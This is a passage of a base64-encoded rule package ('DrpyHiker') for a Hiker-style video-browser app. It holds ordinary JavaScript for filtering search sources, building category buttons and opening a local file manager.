WFuYWdlKSB7XFxuICAgICAgICAvL2xvZyhcXFwib25DaGFuZ2U6XFxcIit0ZXh0KVxcbiAgICAgICAgc2VhcmNoS2V5ID0gdGV4dDtcXG4gICAgICAgIG1hbmFnZS5saXN0Lmxlbmd0aCA9IDA7XFxuICAgICAgICBkeW5hbWljU291cmNlLmxlbmd0aCA9IDA7XFxuICAgICAgICBpZiAodGV4dCkge1xcbiAgICAgICAgICBjYW5TZWFyY2hTb3VyY2UuZm9yRWFjaCgodiwgaSkgPT4ge1xcbiAgICAgICAgICAgIGlmICh0ZXh0LnNwbGl0KC9cXFxcfC8pLmZpbHRlcihmID0+IGYpLnNvbWUoeCA9PiB2Lm5hbWUuaW5jbHVkZXMoeCkpKSB7XFxuICAgICAgICAgICAgICBkeW5hbWljU291cmNlLnB1c2godik7XFxuICAgICAgICAgICAgICBtYW5hZ2UubGlzdC5wdXNoKHNlYXJjaEFsbG93LmluY2x1ZGVzKHYua2V5KSA/IFxcXCLigJzigJzigJ3igJ1cXFwiICsgKHYubmFtZSArIFxcXCJcXFwiKS5mb250Y29sb3IoXFxcIiMwMDk5NjZcXFwiKSA6IHYubmFtZSlcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgIH0pO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgZHluYW1pY1NvdXJjZSA9IGNhblNlYXJjaFNvdXJjZS5zbGljZSgpO1xcbiAgICAgICAgICBPYmplY3QuYXNzaWduKG1hbmFnZS5saXN0LCBnZXROYW1lcygpKTtcXG5cXG4gICAgICAgIH1cXG4gICAgICAgIG1hbmFnZS5jaGFuZ2UoKTtcXG4gICAgICB9LFxcbiAgICAgIGRlZmF1bHRWYWx1ZTogXFxcIlxcXCIsXFxuICAgICAgY2xpY2socywgbWFuYWdlKSB7XFxuICAgICAgICAvL3RvYXN0KHMpO1xcbiAgICAgICAgLy9sb2cobWFuYWdlLmxpc3QpO1xcbiAgICAgIH0sXFxuICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZVxcbiAgICB9KSxcXG4gICAgY2xpY2socywgaSwgbWFuYWdlKSB7XFxuXFxuICAgICAgbGV0IGtleSA9IGR5bmFtaWNTb3VyY2VbaV0ua2V5O1xcbiAgICAgIGxldCBpbmRleCA9IC0xO1xcbiAgICAgIGlmICgoaW5kZXggPSBzZWFyY2hBbGxvdy5pbmRleE9mKGtleSkpICE9PSAtMSkge1xcbiAgICAgICAgbWFuYWdlLmxpc3RbaV0gPSBkeW5hbWljU291cmNlW2ldLm5hbWU7XFxuICAgICAgICBzZWFyY2hBbGxvdy5zcGxpY2UoaW5kZXgsIDEpO1xcbiAgICAgIH0gZWxzZSB7XFxuICAgICAgICBtYW5hZ2UubGlzdFtpXSA9IFxcXCLigJzigJzigJ3igJ1cXFwiICsgKGR5bmFtaWNTb3VyY2VbaV0ubmFtZSArIFxcXCJcXFwiKS5mb250Y29sb3IoXFxcIiMwMDk5NjZcXFwiKTtcXG4gICAgICAgIHNlYXJjaEFsbG93LnB1c2goa2V5KTtcXG4gICAgICB9XFxuXFxuICAgICAgcnVudGltZUNvbmZpZy5zZXRTZWFyY2hBbGxvdygpO1xcbiAgICAgIG1hbmFnZS5jaGFuZ2UoKTtcXG4gICAgfSxcXG4gICAgbWVudUNsaWNrKG1hbmFnZSkge1xcbiAgICAgIGhpa2VyUG9wLnNlbGVjdENlbnRlcih7XFxuICAgICAgICBvcHRpb25zOiBbXFxcIuaUueWPmOagt+W8j1xcXCIsIFxcXCLnrZvpgInmupBcXFwiLCBcXFwi6Ieq54S25o6S5bqPXFxcIiwgXFxcIuWAkuW6j1xcXCIsIFxcXCLlhajpgIlcXFwiLCBcXFwi5Y+N6YCJXFxcIl0sXFxuICAgICAgICBjb2x1bW5zOiAyLFxcbiAgICAgICAgdGl0bGU6IFxcXCLor7fpgInmi6lcXFwiLFxcbiAgICAgICAgY2xpY2socywgaSkge1xcbiAgICAgICAgICBpZiAoaSA9PT0gMCkge1xcbiAgICAgICAgICAgIHNwZW4gPSBzcGVuID09IDMgPyAxIDogMztcXG4gICAgICAgICAgICBtYW5hZ2UuY2hhbmdlQ29sdW1ucyhzcGVuKTtcXG4gICAgICAgICAgfSBlbHNlIGlmIChpID09PSAxKSB7XFxuICAgICAgICAgICAgaGlrZXJQb3AuaW5wdXRDb25maXJtKHtcXG4gICAgICAgICAgICAgIGNvbnRlbnQ6IFxcXCLovpPlhaXlhbPplK7lrZcg56m65pi+56S65YWo6YOoXFxcIixcXG4gICAgICAgICAgICAgIHRpdGxlOiBcXFwi562b6YCJ5rqQXFxcIixcXG4gICAgICAgICAgICAgIGhpbnQ6IFxcXCLmupDlhbPplK7lrZcg5aSa5Liq55SofOmalOW8gFxcXCIsXFxuICAgICAgICAgICAgICBkZWZhdWx0VmFsdWU6IHNlYXJjaEtleSxcXG4gICAgICAgICAgICAgIHRleHRhcmVhOiBmYWxzZSwgLy/lpJrooYzmqKHlvI9cXG4gICAgICAgICAgICAgIG1heFRleHRhcmVhOiB0cnVlLFxcbiAgICAgICAgICAgICAgbm9BdXRvU29mdDogZmFsc2UsXFxuICAgICAgICAgICAgICAvL2hpZGVDYW5jZWw6IHRydWUsXFxuICAgICAgICAgICAgICBjb25maXJtKHRleHQpIHtcXG4gICAgICAgICAgICAgICAgc2VhcmNoS2V5ID0gdGV4dDtcXG4gICAgICAgICAgICAgICAgbWFuYWdlLmxpc3QubGVuZ3RoID0gMDtcXG4gICAgICAgICAgICAgICAgZHluYW1pY1NvdXJjZS5sZW5ndGggPSAwO1xcbiAgICAgICAgICAgICAgICBpZiAodGV4dCkge1xcbiAgICAgICAgICAgICAgICAgIGNhblNlYXJjaFNvdXJjZS5mb3JFYWNoKCh2LCBpKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBpZiAodGV4dC5zcGxpdCgvXFxcXHwvKS5maWx0ZXIoZiA9PiBmKS5zb21lKHggPT4gdi5uYW1lLmluY2x1ZGVzKHgpKSkge1xcbiAgICAgICAgICAgICAgICAgICAgICBkeW5hbWljU291cmNlLnB1c2godik7XFxuICAgICAgICAgICAgICAgICAgICAgIG1hbmFnZS5saXN0LnB1c2goc2VhcmNoQWxsb3cuaW5jbHVkZXModi5rZXkpID8gXFxcIuKAnOKAnOKAneKAnVxcXCIgKyAodi5uYW1lICsgXFxcIlxcXCIpLmZvbnRjb2xvcihcXFwiIzAwOTk2NlxcXCIpIDogdi5uYW1lKVxcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgIGR5bmFtaWNTb3VyY2UgPSBjYW5TZWFyY2hTb3VyY2Uuc2xpY2UoKTtcXG4gICAgICAgICAgICAgICAgICBPYmplY3QuYXNzaWduKG1hbmFnZS5saXN0LCBnZXROYW1lcygpKTtcXG5cXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBtYW5hZ2UuY2hhbmdlKCk7XFxuICAgICAgICAgICAgICAgIC8vcmV0dXJuIFxcXCJ0b2FzdDovL+i+k+WFpeS6hlxcXCIgKyB0ZXh0O1xcbiAgICAgICAgICAgICAgfSxcXG5cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgfSBlbHNlIGlmIChpID09PSAyKSB7XFxuICAgICAgICAgICAgbGV0IGxpc3QgPSBPYmplY3QuYXNzaWduKFtdLCBtYW5hZ2UubGlzdCk7XFxuICAgICAgICAgICAgbWFuYWdlLmxpc3QubGVuZ3RoID0gMDtcXG5cXG5cXG4gICAgICAgICAgICBkeW5hbWljU291cmNlLnNvcnQoKGEsIGIpID0+IHtcXG4gICAgICAgICAgICAgIHJldHVybiBTdHJpbmcoYS5uYW1lKS5sb2NhbGVDb21wYXJlKFN0cmluZyhiLm5hbWUpLCB1bmRlZmluZWQsIHtcXG4gICAgICAgICAgICAgICAgbnVtZXJpYzogdHJ1ZSxcXG4gICAgICAgICAgICAgICAgc2Vuc2l0aXZpdHk6ICdiYXNlJ1xcbiAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgT2JqZWN0LmFzc2lnbihtYW5hZ2UubGlzdCwgZ2V0TmFtZXMoKSk7XFxuICAgICAgICAgICAgbWFuYWdlLmNoYW5nZSgpO1xcbiAgICAgICAgICB9IGVsc2UgaWYgKGkgPT0gMykge1xcbiAgICAgICAgICAgIG1hbmFnZS5saXN0LnJldmVyc2UoKTtcXG4gICAgICAgICAgICBkeW5hbWljU291cmNlLnJldmVyc2UoKTtcXG5cXG4gICAgICAgICAgICBtYW5hZ2UuY2hhbmdlKCk7XFxuICAgICAgICAgIH0gZWxzZSBpZiAoaSA9PSA0KSB7XFxuICAgICAgICAgICAgZHluYW1pY1NvdXJjZS5mb3JFYWNoKHYgPT4ge1xcbiAgICAgICAgICAgICAgaWYgKCFzZWFyY2hBbGxvdy5pbmNsdWRlcyh2KSkge1xcbiAgICAgICAgICAgICAgICBzZWFyY2hBbGxvdy5wdXNoKHYua2V5KTtcXG4gICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICBPYmplY3QuYXNzaWduKG1hbmFnZS5saXN0LCBnZXROYW1lcygpKTtcXG4gICAgICAgICAgICBydW50aW1lQ29uZmlnLnNldFNlYXJjaEFsbG93KCk7XFxuICAgICAgICAgICAgbWFuYWdlLmNoYW5nZSgpO1xcbiAgICAgICAgICB9IGVsc2UgaWYgKGkgPT0gNSkge1xcbiAgICAgICAgICAgIGxldCB0ZW1saXN0ID0gc2VhcmNoQWxsb3cuc2xpY2UoKTtcXG4gICAgICAgICAgICBzZWFyY2hBbGxvdy5sZW5ndGggPSAwO1xcbiAgICAgICAgICAgIGR5bmFtaWNTb3VyY2UuZm9yRWFjaCh2ID0+IHtcXG4gICAgICAgICAgICAgIGlmICh0ZW1saXN0LmluY2x1ZGVzKHYua2V5KSkgcmV0dXJuO1xcbiAgICAgICAgICAgICAgc2VhcmNoQWxsb3cucHVzaCh2LmtleSk7XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgT2JqZWN0LmFzc2lnbihtYW5hZ2UubGlzdCwgZ2V0TmFtZXMoKSk7XFxuICAgICAgICAgICAgcnVudGltZUNvbmZpZy5zZXRTZWFyY2hBbGxvdygpO1xcbiAgICAgICAgICAgIG1hbmFnZS5jaGFuZ2UoKTtcXG4gICAgICAgICAgfVxcbiAgICAgICAgfSxcXG4gICAgICB9KTtcXG4gICAgfVxcbiAgfSk7XFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5YiG57G7XCIsXCJwYXRoXCI6XCJjYXRlZ29yeXNcIixcInJ1bGVcIjpcImpzOlxcbmxldCBmbCA9IHt9O1xcbmxldCByZXN1bHRzID0gW107XFxubGV0IGhvbWVsaXN0ID0gW107XFxubGV0IGNhdGUgPSBcXFwiXFxcIjtcXG5cXG5mdW5jdGlvbiBnZXRDYXRlZ29yeXMobGF5b3V0LGRycHksIHBhZ2UpIHtcXG4gIGxldCBydWxlPWRycHkucnVuTWFpbignZnVuY3Rpb24gbWFpbigpe3JldHVybiBydWxlfScpO1xcbiAgaWYocnVsZS7kuIDnuqc9PVxcXCJcXFwifHxydWxlLuS4gOe6pz09dW5kZWZpbmVkKXtcXG4gICAgY2xlYXJNeVZhcihcXFwibGlua3NcXFwiKTtcXG4gICAgbGF5b3V0Lmxlbmd0aD0wO1xcbiAgICB0aHJvdyBuZXcgRXJyb3IoXFxcIuivpea6kOS4uuaQnOe0oua6kO+8jOS7heiDvemAmui/h+aQnOe0ouiuv+mXruaVsOaNrlxcXCIpXFxuICB9XFxuICB2YXIgZ2V0UmFuZ2VDb2xvcnMgPSBmdW5jdGlvbiAoKSB7XFxuICAgIHJldHVybiAnIycgKyAoJzAwMDAwJyArIChNYXRoLnJhbmRvbSgpICogMHgxMDAwMDAwIDw8IDApLnRvU3RyaW5nKDE2KSkuc3Vic3RyKC02KTtcXG4gIH1cXG4gIGxldCBjYXRlZ29yeXMgPSBKU09OLnBhcnNlKGRycHkuaG9tZSgpKTtcXG4gIGxldCBmaWx0ZXJzID0gY2F0ZWdvcnlzLmZpbHRlcnM7XFxuICBsZXQgY2F0ZXMgPSBjYXRlZ29yeXMuY2xhc3MgfHwgW107XFxuICBpZiAocGFnZSA9PSAxKSB7XFxuICAgIGhvbWVsaXN0ID0gSlNPTi5wYXJzZShkcnB5LmhvbWVWb2QoKSkubGlzdDtcXG4gICAgaWYgKGhvbWVsaXN0ICE9IHVuZGVmaW5lZCAmJiBob21lbGlzdC5sZW5ndGgpIHtcXG4gICAgICBwdXRNeVZhcihcXFwiaXNob21lXFxcIiwgXFxcIjFcXFwiKTtcXG4gICAgfVxcbiAgfVxcbiAgaWYgKGNhdGVzLmxlbmd0aCA9PSAwICYmIChob21lbGlzdCA9PSB1bmRlZmluZWQgfHwgaG9tZWxpc3QubGVuZ3RoID09IDApKSB7XFxuICAgIGNsZWFyTXlWYXIoXFxcImxpbmtzXFxcIik7XFxuICAgIGxheW91dC5sZW5ndGg9MDtcXG4gICAgdGhyb3cgbmV3IEVycm9yKFxcXCLliIbnsbvojrflj5blpLHotKXlj6/og73nvZHnu5zpl67pophcXFwiKTtcXG4gIH1cXG4gIGlmIChnZXRNeVZhcihcXFwiaXNob21lXFxcIiwgXFxcIjBcXFwiKSA9PSBcXFwiMVxcXCIpIHtcXG4gICAgY2F0ZXMudW5zaGlmdCh7XFxuICAgICAgdHlwZV9uYW1lOiAn5o6o6I2QJyxcXG4gICAgICB0eXBlX2lkOiAnaG9tZScsXFxuICAgIH0pXFxuICB9XFxuICBsZXQgbG9hZGk9bGF5b3V0LmZpbmRJbmRleCh4PT54LmV4dHJhJiZ4LmV4dHJhLmlkPT1NWV9SVUxFLnRpdGxlK1xcXCJsb2FkXFxcIik7XFxuICBpZihsb2FkaSE9LTEpe1xcbiAgICAgIGxheW91dC5zcGxpY2UobG9hZGksMSlcXG4gIH1cXG4gIHB1dE15VmFyKFxcXCJsaW5rc1xcXCIsXFxcIjFcXFwiKTtcXG4gIGxldCBjYXRlaSA9IGdldE15VmFyKFxcXCJjYXRlaVxcXCIsIFxcXCIwXFxcIik7XFxuICBjYXRlID0gY2F0ZXNbY2F0ZWldLnR5cGVfaWQ7XFxuXFxuICB2YXIgZm9sZCA9IHN0b3JhZ2UwLmdldEl0ZW0oXFxcImZvbGRcXFwiLCBcXFwiMFxcXCIpO1xcbiAgbGV0IGNvbG9yID0gZ2V0UmFuZ2VDb2xvcnMoKTtcXG5cXG4gIGlmIChwYWdlID09IDEpIHtcXG4gICAgY2F0ZXMuZm9yRWFjaCgoaXRlbSwgaSkgPT4ge1xcbiAgICAgIGxldCB0ID0gY2F0ZWkgPT0gaSA/IFxcXCLigJzigJzigJ3igJ1cXFwiICsgXFxcIjxiPlxcXCIraXRlbS50eXBlX25hbWUuZm9udGNvbG9yKGNvbG9yKSArXFxcIjwvYj5cXFwiOiBpdGVtLnR5cGVfbmFtZTtcXG4gICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogdCxcXG4gICAgICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoaSwgdGlkKSA9PiB7XFxuICAgICAgICAgIHB1dE15VmFyKFxcXCJjYXRlaVxcXCIsIGkpO1xcbiAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgfSwgaSwgaXRlbS50eXBlX2lkKSxcXG4gICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICB0aWQ6IGl0ZW0udHlwZV9pZCxcXG4gICAgICAgICAgYWN0aXZlOiBjYXRlaSA9PSBpID8gdHJ1ZSA6IGZhbHNlLFxcbiAgICAgICAgfVxcbiAgICAgIH0pXFxuICAgIH0pXFxuICB9XFxuXFxuICBpZiAoY2F0ZSAhPSAnaG9tZScgJiYgcGFnZSA9PSAxKSB7XFxuICAgIGxldCBob21laSA9IGxheW91dC5maW5kSW5kZXgoeCA9PiB7XFxuICAgICAgcmV0dXJuIHguZXh0cmEgJiYgeC5leHRyYS50aWQgPT0gXFxcImhvbWVcXFwiXFxuICAgIH0pO1xcbiAgICBpZiAoaG9tZWkgPT0gLTEpIHtcXG4gICAgICBob21laSA9IGxheW91dC5maW5kSW5kZXgoeCA9PiB7XFxuICAgICAgICByZXR1cm4geC5leHRyYSAmJiB4LmV4dHJhLnRpZDtcXG4gICAgICB9KSAtIDE7XFxuICAgIH1cXG4gICAgaWYgKGZpbHRlcnMgJiYgZmlsdGVycy5oYXNPd25Qcm9wZXJ0eShjYXRlKSkge1xcbiAgICAgIGlmIChob21laSAhPSAtMSkge1xcbiAgICAgICAgbGF5b3V0LnNwbGljZShob21laSArIDEsIDAsIHtcXG4gICAgICAgICAgdGl0bGU6IGZvbGQgPT0gXFxcIjBcXFwiID8gXFxcIuKAnOKAnOKAneKAnTxiPlxcXCIgKyBcXFwi4oinXFxcIi5mb250Y29sb3IoXFxcIiMxYWFkMTlcXFwiKSArIFxcXCI8L2I+XFxcIiA6IFxcXCLigJzigJzigJ3igJ08Yj5cXFwiICsgXFxcIuKIqFxcXCIuZm9udGNvbG9yKFxcXCIjRkYwMDAwXFxcIikgKyBcXFwiPC9iPlxcXCIsXFxuICAgICAgICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCIsXFxuICAgICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoZm9sZCkgPT4ge1xcbiAgICAgICAgICAgIHN0b3JhZ2UwLnNldEl0ZW0oXFxcImZvbGRcXFwiLCBmb2xkID09IFxcXCIwXFxcIiA/IFxcXCIxXFxcIiA6IFxcXCIwXFxcIik7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgICB9LCBmb2xkKSxcXG4gICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBhY3RpdmU6IGZhbHNlLFxcbiAgICAgICAgICB9XFxuICAgICAgICB9KVxcbiAgICAgIH1cXG5cXG4gICAgICBsZXQgYWN0aXZlaSA9IGxheW91dC5maW5kSW5kZXgoeCA9PiB4LmV4dHJhICYmIHguZXh0cmEuYWN0aXZlKTtcXG4gICAgICBpZiAoYWN0aXZlaSAhPSAtMSkge1xcbiAgICAgICAgbGF5b3V0LnNwbGljZShhY3RpdmVpLCAwLCB7XFxuICAgICAgICAgIHRpdGxlOiBcXFwi4oCc4oCc4oCd4oCdXFxcIiArICfwn4yAJyxcXG4gICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXG4gICAgICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChjKSA9PiB7XFxuICAgICAgICAgICAgbGV0IGNhdGVfb2JqID0gc3RvcmFnZTAuZ2V0TXlWYXIoXFxcImNhdGVfb2JqXFxcIiwge30pO1xcbiAgICAgICAgICAgIGRlbGV0ZSBjYXRlX29ialtjXTtcXG4gICAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihcXFwiY2F0ZV9vYmpcXFwiLCBjYXRlX29iaik7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5riF6Zmk5a6M5oiQXFxcIjtcXG4gICAgICAgICAgfSwgY2F0ZSlcXG4gICAgICAgIH0pXFxuICAgICAgfVxcblxcbiAgICAgIGxldCBjbGFzc2lmeSA9IGZpbHRlcnNbY2F0ZV07XFxuICAgICAgdmFyIGluaXRfY2F0ZSA9IG5ldyBBcnJheShjbGFzc2lmeS5sZW5ndGgpLmZpbGwoXFxcIi0xXFxcIik7XFxuICAgICAgbGV0IGNhdGVfb2JqID0gc3RvcmFnZTAuZ2V0TXlWYXIoXFxcImNhdGVfb2JqXFxcIiwge30pO1xcbiAgICAgIGNhdGVfb2JqW2NhdGVdID0gY2F0ZV9vYmpbY2F0ZV0gPyBjYXRlX29ialtjYXRlXSA6IGluaXRfY2F0ZVxcbiAgICAgIHZhciBjYXRlX3RlbXAgPSBjYXRlX29ialtjYXRlXTtcXG4gICAgICAvL3ZhciBmaWx0ZXJfZGVmPXN0b3JhZ2UwLmdldEl0ZW0oXFxcImZpbHRlcl9kZWZcXFwiLCB7fSk7XFxuICAgICAgY2xhc3NpZnkuZm9yRWFjaCgoeCwgaW5kZXgpID0+IHtcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgY29sX3R5cGU6ICdibGFua19ibG9jaydcXG4gICAgICAgIH0pXFxuICAgICAgICB4LnZhbHVlLmZvckVhY2goKGl0LCBpKSA9PiB7XFxuICAgICAgICAgIGxldCB0ID0gaXQubjtcXG4gICAgICAgICAgaWYgKGNhdGVfdGVtcFtpbmRleF0gPT0gaSkge1xcbiAgICAgICAgICAgIHQgPSBcXFwiPGI+PGZvbnQgY29sb3I9XFxcIiArIGNvbG9yICsgXFxcIj5cXFwiICsgdCArIFxcXCI8L2ZvbnQ+PC9iPlxcXCI7XFxuICAgICAgICAgICAgZmxbeC5rZXldID0gaXQudjtcXG4gICAgICAgICAgfVxcbiAgICAgICAgICBpZiAoY2F0ZV90ZW1wW2luZGV4XSA9PSBcXFwiLTFcXFwiKSB7XFxuICAgICAgICAgICAgZmxbeC5rZXldID0gXFxcInVuZGVmaW5lZFxcXCI7XFxuICAgICAgICAgIH1cXG4gICAgICAgICAgaWYgKGZvbGQgPT0gMSkge1xcbiAgICAgICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArIHQsXFxuICAgICAgICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKG8pID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IGkgPSBvLmk7XFxuICAgICAgICAgICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKFxcXCJpc19kZWZcXFwiLCBcXFwiMVxcXCIpO1xcbiAgICAgICAgICAgICAgICBsZXQgY2F0ZV9vYmogPSBzdG9yYWdlMC5nZXRNeVZhcihcXFwiY2F0ZV9vYmpcXFwiLCB7fSk7XFxuXFxuICAgICAgICAgICAgICAgIGxldCBjYXRlX3RlbXAgPSBvLmNhdGVfdGVtcDtcXG4gICAgICAgICAgICAgICAgaWYgKGNhdGVfdGVtcC5jb25zdHJ1Y3RvciAhPSBBcnJheSkge1xcbiAgICAgICAgICAgICAgICAgIGNhdGVfdGVtcCA9IFtdO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGxldCBpbmRleCA9IG8uaW5kZXg7XFxuICAgICAgICAgICAgICAgIGxldCBjID0gY2F0ZV90ZW1wW2luZGV4XSB8fCBcXFwiLTFcXFwiO1xcbiAgICAgICAgICAgICAgICAvL2xvZyhjKVxcbiAgICAgICAgICAgICAgICBpZiAoYyA9PSBpKSB7XFxuICAgICAgICAgICAgICAgICAgby5jYXRlX3RlbXBbaW5kZXhdID0gXFxcIi0xXFxcIjtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICBvLmNhdGVfdGVtcFtpbmRleF0gPSBpICsgXFxcIlxcXCI7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgY2F0ZV9vYmpbby5jYXRlXSA9IGNhdGVfdGVtcDtcXG4gICAgICAgICAgICAgICAgLy9sb2coY2F0ZV90ZW1wKVxcbiAgICAgICAgICAgICAgICAvL3N0b3JhZ2UwLnB1dE15VmFyKFxcXCJjYXRlX3RlbXBcXFwiLCBjYXRlX3RlbXApO1xcbiAgICAgICAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihcXFwiY2F0ZV9vYmpcXFwiLCBjYXRlX29iaik7XFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICAgICAgICB9LCB7XFxuICAgICAgICAgICAgICAgIGluZGV4OiBpbmRleCxcXG4gICAgICAgICAgICAgICAgY2F0ZV90ZW1wOiBjYXRlX3RlbXAsXFxuICAgICAgICAgICAgICAgIGk6IGksXFxuICAgICAgICAgICAgICAgIGNhdGU6IGNhdGVcXG4gICAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgICB9XFxuICAgICAgICB9KVxcbiAgICAgIH0pXFxuICAgIH1cXG4gIH1cXG59XFxuXFxuZnVuY3Rpb24gZ2V0RmwoKSB7XFxuICBmbCA9IE9iamVjdC5rZXlzKGZsKS5maWx0ZXIoa2V5ID0+IGZsW2tleV0gIT09IFxcXCJ1bmRlZmluZWRcXFwiKS5yZWR1Y2UoKHJlcywga2V5KSA9PiB7XFxuICAgIHJlc1trZXldID0gZmxba2V5XTtcXG4gICAgcmV0dXJuIHJlcztcXG4gIH0sIHt9KTtcXG4gIHJldHVybiBmbFxcbn1cXG5cXG5mdW5jdGlvbiBnZXRDYXRlTGlzdCgpIHtcXG4gIHJldHVybiB7XFxuICAgIGNhdGUsXFxuICAgIGhvbWVsaXN0XFxuICB9XFxufVxcblxcblxcbiQuZXhwb3J0cyA9IHtcXG4gIGdldGNhdGVsaXN0OiBnZXRDYXRlTGlzdCxcXG4gIGdldGNhdGVnb3J5czogZ2V0Q2F0ZWdvcnlzLFxcbiAgZ2V0Zmw6IGdldEZsXFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5pys5Zyw6KeE5YiZ566h55CGXCIsXCJwYXRoXCI6XCJMb2NhbERpclwiLFwicnVsZVwiOlwianM6XFxuc2V0UGFnZVRpdGxlKFxcXCLmlofku7bnrqHnkIZcXFwiKTtcXG5sZXQgcGF0aCA9IGdldFBhdGgoU3RyaW5nKE1ZX1BBUkFNUy5jcGF0aCkpLnJlcGxhY2UoXFxcImZpbGU6Ly9cXFwiLCBcXFwiXFxcIik7XFxubGV0IGZpbGVTZWxlY3QgPSAkLnJlcXVpcmUoXFxcImh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9ydWxlbGlzdC5qc29uP2lkPTUwOTlcXFwiKTtcXG5maWxlU2VsZWN0LmZpbGVTZWxlY3Rpb24oe1xcbiAgICBjYWxsYmFjazogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICByZXR1cm4gXFxcImVkaXRGaWxlOi8vZmlsZTovL1xcXCIgKyBQQVRIO1xcbiAgICB9KSxcXG4gICAgbWVtb3J5OiBcXFwiZmlsZXBhdGhcXFwiLFxcbiAgICBmaWxlVHlwZTogXFxcIi5qc1xcXCIsXFxuICAgIGV4aXRTZWFyY2hSZWZyZXNoOiB0cnVlLFxcbiAgICBwYXR0ZXJuOiAwLFxcbiAgICByb290RGlyUGF0aDogcGF0aCxcXG4gICAgaW5pdGlhbFBhdGg6IHBhdGgsXFxufSwgTVlfUEFSQU1TLm5ld1dpbmRvdyA/IFtdIDogW3tcXG4gICAgdGl0bGU6IFxcXCLmlrDnqpflj6PmiZPlvIBcXFwiLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiLFxcbiAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvTG9jYWxEaXIjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGNwYXRoOiBNWV9QQVJBTVMuY3BhdGgsXFxuICAgICAgICBuZXdXaW5kb3c6IHRydWUsXFxuICAgICAgICB3aW5kb3dJZDogTVlfUlVMRS50aXRsZSArIFxcXCJAZWRpdGZpbGVcXFwiLFxcbiAgICAgICAgbGluZVZpc2libGU6IGZhbHNlLFxcbiAgICAgICAgcGFnZVRpdGxlOiBcXFwi5paH5Lu2566h55CGXFxcIlxcbiAgICB9XFxufV0pO1wifV0sXCJzYXZlZFwiOmZhbHNlLFwidGl0bGVcIjpcIkRycHlIaWtlclwiLFwidmVyc2lvblwiOjAsXCJ1cmxcIjpcImhpa2VyOi8vcGFnZS9ydWxlTWFuYWdlI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5I1wiLFwiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcImZpbmRfcnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5zZXRQYWdlVGl0bGUoXFxcIuino+aekOeuoeeQhlxcXCIpO1xcbmxldCBjb25maWdzID0gJC5yZXF1aXJlKFxcXCJjb25maWdzXFxcIik7XFxubGV0IGFyciA9IGNvbmZpZ3MuZ2V0SnNvbigpO1xcbmxldCBsZW5ndGggPSBhcnIubGVuZ3RoO1xcblxcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5paw5aKeXFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL3J1bGVFZGl0I25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5IyNub1JlZnJlc2gjXFxcIixcXG4gICAg